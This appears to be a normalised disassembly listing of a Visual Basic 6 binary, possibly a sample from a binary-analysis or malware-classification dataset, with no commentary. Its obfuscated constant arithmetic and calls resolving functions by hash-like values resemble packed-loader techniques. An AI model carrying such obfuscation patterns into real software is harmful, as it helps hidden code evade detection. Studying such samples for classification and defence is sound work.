mov [ ebp - 0x4 ] 0x9e
push 0x0
push r-xdata
mov edx [ ebp - 0xe0 ]
push edx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2cc ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2cc ] rw-data
jmp r-xdata
mov [ ebp - 0x2c0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2c0 ] eax
jmp r-xdata
mov edx [ ebp - 0x2bc ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xa9
cmp [ ebp - 0x38 ] 0xb4f30b20
jne r-xdata
cmp [ ebp - 0x34 ] 0x1382
jne r-xdata
mov [ ebp - 0x4 ] 0xa2
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2d0 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2d0 ] eax
jmp r-xdata
mov ecx [ ebp - 0x2cc ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xad
mov eax 0x9e692400
neg eax
mov ecx 0xe16
adc ecx 0x0
neg ecx
mov [ ebp - 0x2e8 ] eax
mov [ ebp - 0x2e4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x2e8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x58b
jne r-xdata
mov [ ebp - 0x4 ] 0xa6
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2d4 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2d4 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xb1
cmp [ ebp - 0x38 ] 0x7681cfc0
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x2e4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xaa
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2d8 ] 0x0
push 0x54
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2d8 ] eax
jmp r-xdata
mov eax [ ebp - 0x2d4 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push r-xdata
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xb5
mov eax 0x23520780
neg eax
mov ecx 0x1070
adc ecx 0x0
neg ecx
mov [ ebp - 0x2f8 ] eax
mov [ ebp - 0x2f4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x2f8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x1198
jne r-xdata
mov [ ebp - 0x4 ] 0xae
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2dc ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2dc ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xb9
cmp [ ebp - 0x38 ] 0xb1409460
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x2f4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xb2
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2e0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2e0 ] eax
jmp r-xdata
mov edx [ ebp - 0x2dc ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xbd
mov eax 0x895283b0
neg eax
mov ecx 0x842
adc ecx 0x0
neg ecx
mov [ ebp - 0x308 ] eax
mov [ ebp - 0x304 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x308 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0xff
jne r-xdata
mov [ ebp - 0x4 ] 0xb6
push 0x0
push r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x2ec ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2ec ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xc1
mov edx 0x2427b700
neg edx
mov eax 0xfc0
adc eax 0x0
neg eax
mov [ ebp - 0x318 ] edx
mov [ ebp - 0x314 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x318 ]
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x304 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xba
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2f0 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x2f0 ] eax
jmp r-xdata
mov edx [ ebp - 0x2ec ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xc5
mov ecx 0x3a39b6f0
neg ecx
mov edx 0x4e
adc edx 0x0
neg edx
mov [ ebp - 0x320 ] ecx
mov [ ebp - 0x31c ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x320 ]
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x314 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xbe
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x2fc ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x2fc ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xc9
cmp [ ebp - 0x38 ] 0x29f1ade0
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x31c ]
jne r-xdata
mov [ ebp - 0x4 ] 0xc2
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x30c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x30c ] rw-data
jmp r-xdata
mov [ ebp - 0x300 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x300 ] eax
jmp r-xdata
mov edx [ ebp - 0x2fc ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xcd
mov ecx 0xc9516a30
neg ecx
mov edx 0x2a7
adc edx 0x0
neg edx
mov [ ebp - 0x330 ] ecx
mov [ ebp - 0x32c ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x330 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x10f0
jne r-xdata
mov [ ebp - 0x4 ] 0xc6
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x310 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x310 ] eax
jmp r-xdata
mov ecx [ ebp - 0x30c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xd1
cmp [ ebp - 0x38 ] 0x64b07280
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x32c ]
jne r-xdata
mov [ ebp - 0x4 ] 0xca
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x324 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x324 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xd5
cmp [ ebp - 0x38 ] 0xbb03d250
jne r-xdata
cmp [ ebp - 0x34 ] 0x57
jne r-xdata
mov [ ebp - 0x4 ] 0xce
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x328 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x328 ] eax
jmp r-xdata
mov edx [ ebp - 0x324 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0xd9
mov edx 0x70b7d8e0
neg edx
mov eax 0x1068
adc eax 0x0
neg eax
mov [ ebp - 0x348 ] edx
mov [ ebp - 0x344 ] eax
mov ecx [ ebp - 0x38 ]
cmp ecx [ ebp - 0x348 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x537
jne r-xdata
mov [ ebp - 0x4 ] 0xd2
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x334 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x334 ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0xdd
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x344 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xd6
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x338 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x338 ] eax
jmp r-xdata
mov edx [ ebp - 0x334 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x34c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x34c ] rw-data
jmp r-xdata
mov [ ebp - 0x4 ] 0xda
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x33c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x33c ] rw-data
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x350 ] 0x0
push 0x288
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x350 ] eax
jmp r-xdata
mov ecx [ ebp - 0x34c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
lea eax [ ebp - 0xe8 ]
push eax
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x288 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x340 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x340 ] eax
jmp r-xdata
mov ecx [ ebp - 0x33c ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
push r-xdata
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
call [ __vbaErrorOverflow@IAT ]
int3
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] 0xe7
mov eax 0x1
cdq
idiv [ rw-data ]
mov eax [ rw-data ]
xor eax edx
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] eax
mov [ ebp - 0x4 ] 0xe8
mov eax [ rw-data ]
and eax 0x80000000
jns r-xdata
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0xe8 ] 0x0
mov ecx [ ebp - 0x168 ]
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0xf8 ] 0x9
lea edx [ ebp - 0xf8 ]
lea ecx [ ebp - 0x7c ]
call [ __vbaVarMove@IAT ]
mov [ ebp - 0x4 ] 0xde
push 0xffffffff
call [ __vbaOnError@IAT ]
mov [ ebp - 0x4 ] 0xdf
mov edx r-xdata
mov ecx rw-data
call [ __vbaStrCopy@IAT ]
mov [ ebp - 0x4 ] 0xe0
mov edx r-xdata
mov ecx rw-data
call [ __vbaStrCopy@IAT ]
mov [ ebp - 0x4 ] 0xe1
mov [ ebp - 0x140 ] 0x18bb6edd
mov [ ebp - 0x13c ] 0xf7c69891
mov edx r-xdata
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrCopy@IAT ]
lea edx [ ebp - 0x140 ]
push edx
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x13caba81
call sub_4767e0
mov [ rw-data ] eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0xe2
mov [ ebp - 0x140 ] 0x1cf91b65
mov [ ebp - 0x13c ] 0x4c555225
mov edx r-xdata
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrCopy@IAT ]
lea edx [ ebp - 0x140 ]
push edx
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x8abeda7b
call sub_4767e0
mov [ rw-data ] eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0xe3
push 0x0
call [ __vbaOnError@IAT ]
jmp r-xdata
xor eax 0x1
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xe9
cmp [ rw-data ] 0x17f16
je r-xdata
dec eax
or eax 0xffffffff
inc eax
mov [ ebp - 0x4 ] 0xec
mov ecx [ rw-data ]
push ecx
mov edx [ rw-data ]
push edx
call [ __vbaStrCat@IAT ]
mov edx eax
mov ecx rw-data
call [ __vbaStrMove@IAT ]
mov [ ebp - 0x4 ] 0xed
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebp - 0x354 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x354 ] rw-data
jmp r-xdata
mov [ ebp - 0x4 ] 0xe5
push 0x64
lea edx [ ebp - 0xf8 ]
push edx
call [ Ordinal_MSVBVM60_526@IAT ]
lea eax [ ebp - 0xf8 ]
push eax
call [ __vbaStrVarMove@IAT ]
mov edx eax
mov ecx rw-data
call [ __vbaStrMove@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ __vbaFreeVar@IAT ]
mov [ ebp - 0x4 ] 0xe6
mov ecx [ rw-data ]
add ecx 0x1
jo r-xdata
mov [ ebp - 0x358 ] 0x0
push 0x14c
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x358 ] eax
jmp r-xdata
mov eax [ ebp - 0x354 ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
push 0xffffffff
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x14c ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x35c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x35c ] rw-data
jmp r-xdata
mov [ ebp - 0x4 ] 0xee
call sub_476ad0
mov [ ebp - 0x4 ] 0xef
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x360 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x360 ] rw-data
jmp r-xdata
push r-xdata
mov ecx [ rw-data ]
push ecx
call [ __vbaStrCat@IAT ]
mov edx eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrMove@IAT ]
push eax
mov edx [ ebp - 0x35c ]
mov eax [ edx ]
push eax
push r-xdata
call [ __vbaPrintObj@IAT ]
add esp 0xc
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0xf0
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x364 ] 0x0
push 0x288
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x364 ] eax
jmp r-xdata
mov ecx [ ebp - 0x360 ]
mov edx [ ecx ]
mov [ ebp - 0x144 ] edx
lea eax [ ebp - 0xe8 ]
push eax
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x288 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x102
mov eax [ rw-data ]
cdq
and edx 0xf
add eax edx
sar eax 0x4
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0x103
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x100
fild [ rw-data ]
fstp [ ebp - 0x36c ]
fld [ ebp - 0x36c ]
fadd [ r-xdata ]
fnstsw ax
test al 0xd
jne r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call [ __vbaLateIdCallLd@IAT ]
add esp 0x10
push eax
call [ __vbaI4Var@IAT ]
mov [ rw-data ] eax
lea ecx [ ebp - 0xe8 ]
call [ __vbaFreeObj@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ __vbaFreeVar@IAT ]
mov [ ebp - 0x4 ] 0xf1
lea edx [ ebp - 0xf8 ]
push edx
call [ Ordinal_MSVBVM60_612@IAT ]
lea eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x108 ]
push ecx
call [ Ordinal_MSVBVM60_544@IAT ]
lea edx [ ebp - 0x108 ]
push edx
call [ __vbaI2Var@IAT ]
mov [ ebp - 0x54 ] ax
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x2
call [ __vbaFreeVarList@IAT ]
add esp 0xc
mov [ ebp - 0x4 ] 0xf2
push 0xb5
lea edx [ ebp - 0xf8 ]
push edx
call [ Ordinal_MSVBVM60_526@IAT ]
lea eax [ ebp - 0xf8 ]
push eax
call [ __vbaStrVarMove@IAT ]
mov edx eax
lea ecx [ ebp - 0xc0 ]
call [ __vbaStrMove@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ __vbaFreeVar@IAT ]
mov [ ebp - 0x4 ] 0xf3
mov edx r-xdata
lea ecx [ ebp - 0x90 ]
call [ __vbaStrCopy@IAT ]
mov [ ebp - 0x4 ] 0xf4
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x118 ] 0x4008
push 0x0
lea edx [ ebp - 0x118 ]
push edx
call [ Ordinal_MSVBVM60_645@IAT ]
mov edx eax
lea ecx [ ebp - 0x30 ]
call [ __vbaStrMove@IAT ]
mov [ ebp - 0x4 ] 0xf5
push 0xc3
mov eax [ ebp - 0xd4 ]
push eax
call [ Ordinal_MSVBVM60_618@IAT ]
mov edx eax
lea ecx [ ebp - 0x24 ]
call [ __vbaStrMove@IAT ]
mov [ ebp - 0x4 ] 0xf6
lea ecx [ ebp - 0xf8 ]
push ecx
call [ Ordinal_MSVBVM60_546@IAT ]
lea edx [ ebp - 0xf8 ]
push edx
call [ __vbaStrVarMove@IAT ]
mov edx eax
lea ecx [ ebp - 0x58 ]
call [ __vbaStrMove@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ __vbaFreeVar@IAT ]
mov [ ebp - 0x4 ] 0xf7
mov [ ebp - 0xf0 ] 0x95
mov [ ebp - 0xf8 ] 0x2
lea eax [ ebp - 0xf8 ]
push eax
push 0x1
lea ecx [ ebp - 0xbc ]
push ecx
lea edx [ ebp - 0x108 ]
push edx
call [ Ordinal_MSVBVM60_632@IAT ]
lea edx [ ebp - 0x108 ]
lea ecx [ ebp - 0x50 ]
call [ __vbaVarMove@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ __vbaFreeVar@IAT ]
mov [ ebp - 0x4 ] 0xf8
push 0x1
call [ Ordinal_MSVBVM60_589@IAT ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] 0xf9
mov eax [ ebp - 0x80 ]
push eax
call [ Ordinal_MSVBVM60_523@IAT ]
mov edx eax
lea ecx [ ebp - 0x88 ]
call [ __vbaStrMove@IAT ]
mov [ ebp - 0x4 ] 0xfa
push 0xd
push 0x54ecf430
mov ecx [ ebp - 0xa8 ]
push ecx
mov edx [ ebp - 0xac ]
push edx
call [ __vbaCyMul@IAT ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xcc ] edx
mov [ ebp - 0x4 ] 0xfb
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x4 ] 0xfc
fld [ r-xdata ]
call [ __vbaR8IntI4@IAT ]
mov [ ebp - 0xdc ] eax
mov [ ebp - 0x4 ] 0xfd
mov eax [ ebp - 0x8c ]
push eax
call [ Ordinal_MSVBVM60_527@IAT ]
mov edx eax
lea ecx [ ebp - 0x2c ]
call [ __vbaStrMove@IAT ]
mov [ ebp - 0x4 ] 0xfe
mov [ rw-data ] 0x46976e0
mov [ ebp - 0x4 ] 0xff
or ecx 0xffffffff
test ecx ecx
je r-xdata
mov [ ebp - 0x370 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x370 ] rw-data
jmp r-xdata
jmp r-xdata
call [ __vbaFpI4@IAT ]
mov [ rw-data ] eax
mov [ ebp - 0x374 ] 0x0
push 0xd8
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x374 ] eax
jmp r-xdata
mov edx [ ebp - 0x370 ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
lea ecx [ ebp - 0x13c ]
push ecx
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0xd8 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
jmp [ __vbaFPException@IAT ]
mov [ ebp - 0x378 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x378 ] rw-data
jmp r-xdata
mov ecx [ ebp - 0x13c ]
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x118 ] 0x3
lea edx [ ebp - 0x118 ]
lea ecx [ ebp - 0xa0 ]
call [ __vbaVarMove@IAT ]
mov [ ebp - 0x4 ] 0x104
mov edx 0xf8bfe420
neg edx
mov eax 0x7f4
adc eax 0x0
neg eax
push eax
push edx
call [ __vbaI4Cy@IAT ]
push eax
push 0xfda
push 0x70ecbc10
call [ __vbaI4Cy@IAT ]
push eax
mov ecx 0x8d1f80e0
neg ecx
mov edx 0xffb
adc edx 0x0
neg edx
push edx
push ecx
call [ __vbaI4Cy@IAT ]
push eax
push 0x3c3
push 0x762df770
call [ __vbaI4Cy@IAT ]
push eax
mov eax [ rw-data ]
push eax
call sub_403574
mov [ ebp - 0x13c ] eax
call [ __vbaSetSystemError@IAT ]
mov ecx [ ebp - 0x13c ]
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x118 ] 0x3
lea edx [ ebp - 0x118 ]
lea ecx [ ebp - 0x6c ]
call [ __vbaVarMove@IAT ]
mov [ ebp - 0x4 ] 0x105
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x37c ] 0x0
push 0x2c
push r-xdata
mov eax [ ebp - 0x144 ]
push eax
mov ecx [ ebp - 0x148 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x37c ] eax
jmp r-xdata
mov edx [ ebp - 0x378 ]
mov eax [ edx ]
mov [ ebp - 0x14c ] eax
call [ Ordinal_MSVBVM60_685@IAT ]
push eax
lea ecx [ ebp - 0xe8 ]
push ecx
call [ __vbaObjSet@IAT ]
mov [ ebp - 0x144 ] eax
lea edx [ ebp - 0xe4 ]
push edx
mov eax [ ebp - 0x144 ]
mov ecx [ eax ]
mov edx [ ebp - 0x144 ]
push edx
call [ ecx + 0x2c ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x380 ] 0x0
push 0x54
push r-xdata
mov eax [ ebp - 0x14c ]
push eax
mov ecx [ ebp - 0x150 ]
push ecx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x380 ] eax
jmp r-xdata
mov edx [ ebp - 0xe4 ]
push edx
mov eax [ ebp - 0x14c ]
mov ecx [ eax ]
mov edx [ ebp - 0x14c ]
push edx
call [ ecx + 0x54 ]
fnclex
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jge r-xdata
mov [ ebp - 0x384 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x384 ] rw-data
jmp r-xdata
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0xe8 ]
call [ __vbaFreeObj@IAT ]
mov [ ebp - 0x4 ] 0x106
mov [ ebp - 0x140 ] 0x58e3b5f2
mov [ ebp - 0x13c ] 0xf0a7541a
mov edx r-xdata
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrCopy@IAT ]
lea edx [ ebp - 0x140 ]
push edx
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0xe4 ]
push ecx
push 0x2d54db70
call sub_4767e0
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0x107
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0x384 ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call [ __vbaObjSetAddref@IAT ]
mov [ ebp - 0x4 ] 0x108
push 0x0
push r-xdata
mov edx [ ebp - 0x28 ]
push edx
call [ __vbaLateMemCall@IAT ]
add esp 0xc
__vbaExceptHandler
jmp [ __vbaExceptHandler@IAT ]
_adj_fdiv_m16i
jmp [ _adj_fdiv_m16i@IAT ]
_adj_fdiv_m32
jmp [ _adj_fdiv_m32@IAT ]
_adj_fdiv_m32i
jmp [ _adj_fdiv_m32i@IAT ]
_adj_fdiv_m64
